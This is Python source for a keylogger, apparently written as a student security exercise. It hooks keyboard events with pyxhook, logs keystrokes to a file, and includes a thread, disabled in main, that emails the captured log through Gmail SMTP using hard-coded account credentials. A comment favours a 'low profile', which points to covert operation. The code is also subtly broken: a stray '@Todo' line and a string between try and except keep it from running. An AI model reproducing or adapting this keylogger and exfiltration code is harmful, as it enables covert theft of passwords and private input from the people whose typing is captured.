"""
Authors:
    Dominick Taylor (dxt9140@g.rit.edu)
    Bikash (bm7514@g.rit.edu)
    Isza

Created: 2/28/2018

A simple keylogger file that captures user key events using the pyxhook package.
Note, this is NOT intended as a malicious program. It is used to understand
security principles and demonstrate mastery of secure programming techniques.
"""

import pyxhook
import time
import threading
import smtplib

running = True
string = ""

# Email Logs
class TimerClass(threading.Thread):

    def __init__(self):
        threading.Thread.__init__(self)
        self.event = threading.Event()

    def run(self):
        global running
        while not self.event.is_set() and running is False:
            with open("test.txt", 'r') as datafile:
                data = datafile.read()

                # Initialize mail server for data transport
                SERVER = "smtp.gmail.com"
                PORT = 587
                USER= "ritfakelogger@gmail.com"
                PASS= "fakekeylogg"
                FROM = USER
                TO = ["dxt9140@g.rit.edu"]
                SUBJECT = "Keylogger Data"
                MESSAGE = data

                try:
                    # Connect to the server and send the message
                    server = smtplib.SMTP()
                    server.connect(SERVER,PORT)
                    server.starttls()
                    server.login(USER,PASS)
                    server.sendmail(FROM, TO, SUBJECT, MESSAGE)
                    server.quit()
                    with open("test.txt", 'w') as clear_file:
                        clear_file.write("")
    
                """
                I don't think we should print things to the console. We want
                a low profile. Remove?
                """
                @Todo
                except Exception as e:
                    print(e)

            # Why wait?
            self.event.wait(1)


def keyDownEvent( event ):
    global running
    global string

    if event.Ascii == 8:
        string += "<BackSpace>"

    # Only write printable characters
    elif event.Ascii >= 32:
        string += chr(event.Ascii)

    # Esc ends the program
    if event.Ascii == 27:
        file = open("test.txt", 'a')
        file.write(string)
        file.close()
        string = ""
        running = False


def main():
    global running

    # Clear the data file. Can be removed later once I actually want to
    # receive emails.
    test_file = open("test.txt", "w")
    test_file.write("")
    test_file.close()

    running = True

    # Create PyxHook object
    keyboard_hook = pyxhook.HookManager()

    # keyDownEvent function is called when keydown is detected
    keyboard_hook.KeyDown = keyDownEvent

    # hook the keyboard to listen
    keyboard_hook.HookKeyboard()

    # Begin the keyboard hook thread
    keyboard_hook.start()

    """
    I disabled the actual thread for testing purposes. It's annoying to
    receive a bunch of emails when I can just read the test.txt file.
    """
    # create timeClass object
    # mail = TimerClass()
    # start listening and sending mail
    # mail.start()

    while running:
        time.sleep(0.1)

    # close thread
    keyboard_hook.cancel()

if __name__ == '__main__':
    main()

#------------------------------------
# End of file

